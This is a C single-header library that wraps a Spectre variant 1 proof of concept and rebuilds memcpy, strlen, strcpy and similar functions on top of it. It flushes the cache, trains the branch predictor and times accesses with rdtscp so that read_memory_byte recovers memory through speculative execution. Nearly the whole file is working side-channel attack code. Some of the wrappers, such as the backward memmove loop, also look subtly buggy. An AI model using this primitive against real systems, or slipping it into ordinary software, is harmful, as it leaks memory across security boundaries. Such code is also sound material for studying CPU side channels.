//(c) m1lkweed 2022, GPLv3+

#pragma once

#include <stddef.h>

char read_memory_byte(const void * const address);
void spectre_init();
void *spectre_memcpy(void * restrict dest, void const * restrict src, size_t n);
void *spectre_memmove(void *dest, void *src, size_t n);
int spectre_memcmp(const void *buf1, const void *buf2, size_t count);
void *spectre_memchr(const void *ptr, int ch, size_t count);
void *spectre_memmem(const void * restrict haystack, size_t haystacklen, const void * restrict needle, size_t needlelen);
char *spectre_memccpy(void * restrict dest, const void * restrict src, int c, size_t count);
size_t spectre_strlen(const char *str);
size_t spectre_strnlen(const char *str, size_t max_len);
char *spectre_strcpy(char * restrict dest, const char * restrict src);
char *spectre_strncpy(char * restrict dest, const char * restrict src, size_t count);

#ifdef SPECTRE_MEMTOOLS_IMPLEMENTATION
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>

static _Alignas(64) uint8_t _$spectre_cache_array$[256 * 512];
unsigned _$spectre_cache_hit_threshold$ = 80; //a good default, set in case spectre_init isn't implicitly or explicitly called

static inline int _$spectre_get_access_time$(void *addr){
	unsigned time1, time2, junk;
	[[maybe_unused]] volatile int j;
	time1 = __rdtscp(&junk);
	j = *(char*)addr;
	time2 = __rdtscp(&junk);
	return time2 - time1;
}

static inline int _$spectre_quick_root$(long val){
	int root = val / 2, prevroot = 0, i = 0;
	while(prevroot != root && i++ < 100){
		prevroot = root;
		root = (val / root + root) / 2;
	}
	return root;
}

unsigned spectre__$spectre_cache_hit_threshold$(unsigned num){
	if(num > 0)
		return _$spectre_cache_hit_threshold$ = num;
	unsigned long cached, uncached, i, cycle_estimate = 1000000;
	for(cached = 0, i = 0; i < cycle_estimate; ++i)
		cached += _$spectre_get_access_time$(_$spectre_cache_array$);

	for(cached = 0, i = 0; i < cycle_estimate; ++i)
		cached += _$spectre_get_access_time$(_$spectre_cache_array$);

	for(uncached = 0, i = 0; i < cycle_estimate; ++i){
		_mm_clflush(_$spectre_cache_array$);
		uncached += _$spectre_get_access_time$(_$spectre_cache_array$);
	}
	cached /= cycle_estimate;
	uncached /= cycle_estimate;
	return _$spectre_cache_hit_threshold$ = _$spectre_quick_root$(cached * uncached);
}

char read_memory_byte(const void * const address){
	unsigned int array1_size = 16;
	uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
	static int results[256] = {0};
	unsigned junk = 0;
	volatile uintptr_t training_x, x, malicious_x = (uintptr_t)((char*)address - (char*)array1);
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int j;
	__builtin_memset(results, 0, sizeof(results));
	for(int tries = 999; tries > 0; --tries){
		/* Flush _$spectre_cache_array$[256*(0..255)] from cache */
		for(int i = 0; i < 256; ++i)
			_mm_clflush(&_$spectre_cache_array$[i * 512]); /* intrinsic for clflush instruction */
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for(int j = 29; j >= 0; --j){
			_mm_clflush(&array1_size);
			/* Delay */
			for(int z = 0; z < 100; ++z){
				asm volatile("":::"memory");
			}
			/* Bit twiddling to set x = training_x if j % 6 != 0 or malicious_x if j % 6 == 0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF;
			x = (x | (x >> 16));
			x = training_x ^ (x & (malicious_x ^ training_x));
			/* Call the victim! */
			if(x < array1_size)
				junk &= _$spectre_cache_array$[array1[x] * 512];
		}
		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for(int i = 0; i < 256; ++i){
			int mix_i = ((i * 167) + 13) & 255;
			addr = &_$spectre_cache_array$[mix_i * 512];
			/*
			We need to accurately measure the memory access to the current index of the
			array so we can determine which index was cached by the malicious mispredicted code.
			The best way to do this is to use the rdtscp instruction, which measures current
			processor ticks, and is also serialized.
			*/
			
			time1 = __rdtscp(&junk);
			junk = *addr;
			time2 = __rdtscp(&junk) - time1;
			
			if(time2 <= _$spectre_cache_hit_threshold$ && mix_i != array1[tries % array1_size])
				++results[mix_i]; /* cache hit */
		}
		/* Locate highest & second-highest results results tallies in j/k */
		int k = j = -1;
		for(int i = 0; i < 256; ++i){
			if(j < 0 || results[i] >= results[j]){
				k = j;
				j = i;
			}else if(k < 0 || results[i] >= results[k]){
				k = i;
			}
		}
		if(results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2 * runner-up + 5 or 2 / 0) */
	}
	return (char)j;
}

[[gnu::constructor]] void spectre_init(){
	spectre__$spectre_cache_hit_threshold$(0);
	_mm_clflush(_$spectre_cache_array$);
	for(size_t i = 0; i < sizeof(_$spectre_cache_array$); ++i)
		_$spectre_cache_array$[i] = 0; /* write to _$spectre_cache_array$ so in RAM not copy-on-write zero pages */
}

void *spectre_memcpy(void * restrict dest, void const * restrict src, size_t n){
	char *dest_ = dest;
	const char *src_ = src;
	for(size_t i = 0; i < sizeof(_$spectre_cache_array$); ++i)
		_$spectre_cache_array$[i] = 1; /* write to _$spectre_cache_array$ so in RAM not copy-on-write zero pages */
	/* Start the read loop to read each address */
	for(size_t i = 0; i < n; ++i)
		dest_[i] = read_memory_byte(&src_[i]);
	return dest;
}

void *spectre_memmove(void *dest, void *src, size_t n){
	char *dest_ = dest;
	char *src_ = src;
	if(dest_ == src_)
		return dest_;
	ptrdiff_t branch = n;
	for(size_t i = 0; i < sizeof(_$spectre_cache_array$); ++i)
		_$spectre_cache_array$[i] = 1; /* write to _$spectre_cache_array$ so in RAM not copy-on-write zero pages */
	if((dest_ > src_) && (dest_ - src_ < branch))
		for(size_t i = n; i; --i){
			dest_[i] = read_memory_byte(&src_[i]);
	}else{
		for(size_t i = 0; i < n; ++i)
			dest_[i] = read_memory_byte(&src_[i]);
	}
	return dest_;
}

int spectre_memcmp(const void *buf1, const void *buf2, size_t count){
	if(!count)
		return(0);
	char *buf1_ = (char*)buf1;
	char *buf2_ = (char*)buf2;
	do{
		char c1 = read_memory_byte(buf1_), c2 = read_memory_byte(buf2_);
		if(c1 != c2)
			break;
		++buf1_;
		++buf2_;
	}while(--count);
	return (read_memory_byte(buf1_) - read_memory_byte(buf2_));
}

void *spectre_memchr(const void *ptr, int ch, size_t count){
	unsigned char chr = (unsigned char)ch;
	const unsigned char *pntr = ptr;
	for(size_t i = 0; i < count; ++i){
		if(read_memory_byte(pntr + i) == chr)
			return (void*)(pntr + i);
	}
	return NULL;
}

void *spectre_memmem(const void * restrict haystack, size_t haystacklen, const void * restrict needle, size_t needlelen){
	size_t i, j;
	const char *p;
	if(!needlelen)
		return (void *)haystack;
	if(needlelen <= haystacklen){
	  p = spectre_memchr(haystack, *(const char*)needle, haystacklen);
		if(needlelen == 1)
			return (void*)p;
		if(p){
			haystacklen -= p - (const char *)haystack;
			haystack = p;
		}
		for(i = 0; i < haystacklen; ++i){
			for(j = 0;; ++j){
				if(j == needlelen)
					return (char*)haystack + i;
				if(i + j == haystacklen)
					break;
				if(((char*)needle)[j] != ((char*)haystack)[i + j])
					break;
			}
		}
	}
	return NULL;
}

char *spectre_memccpy(void * restrict dest, const void * restrict src, int c, size_t count){
	char a = 0;
	size_t i = 0;
	for(; (i < count) && (a = read_memory_byte(&((char*)src)[i])) && (a != c); ++i)
		((char*)dest)[i] = a;
	return ((char *)dest) + i;
}

size_t spectre_strlen(const char *str){
	size_t len = 0;
	do{
		if(!read_memory_byte(&str[len]))
			break;
	}while(++len);
	return len;
}

size_t spectre_strnlen(const char *str, size_t max_len){
	if(!str)
		return 0;
	size_t len = 0;
	do{
		if(!read_memory_byte(&str[len]))
			break;
	}while(++len < max_len);
	return len;
}

char *spectre_strcpy(char * restrict dest, const char * restrict src){
	char c = 0;
	size_t i = 0;
	for(; (c = read_memory_byte(&src[i])); ++i)
		dest[i] = c;
	dest[i] = '\0';
	return dest;
}

char *spectre_strncpy(char * restrict dest, const char * restrict src, size_t count){
	char c = 0;
	size_t i = 0;
	for(; (i < count) && (c = read_memory_byte(&src[i])); ++i)
		dest[i] = c;
	do{
		dest[i] = '\0';
	}while(i++ < count);
	return dest;
}
#endif
